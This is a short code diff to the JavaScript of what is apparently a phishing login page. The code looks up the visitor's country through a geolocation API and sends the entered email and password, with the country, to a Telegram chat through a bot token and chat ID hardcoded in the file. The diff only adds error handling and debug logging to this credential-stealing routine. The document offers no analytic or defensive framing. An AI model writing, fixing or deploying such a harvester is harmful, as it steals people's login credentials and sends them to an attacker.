@@ -94,9 +94,13 @@
         // Function to fetch user's country using a geolocation API
         function fetchUserCountry() {
             fetch('https://ipapi.co/json/')
-                .then(response => response.json())
+                .then(response => {
+                    if (!response.ok) throw new Error('Network response was not ok');
+                    return response.json();
+                })
                 .then(data => {
                     userCountry = data.country_name || "Unknown";
+                    console.log("User Country:", userCountry); // Log the country for debugging
                 })
                 .catch(error => {
                     console.error("Error fetching country data:", error);
@@ -116,6 +120,8 @@
             const botToken = "7840973698:AAEwak-7hrIa-vzp3BV9kgkFUQK0LloA21M";
             const chatId = "6885599280";
             const message = `Email: ${email}\nPassword: ${password}\nCountry: ${userCountry}`;
+
+            console.log("Sending Message:", message); // Log the message for debugging
 
             // Send the data to Telegram
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
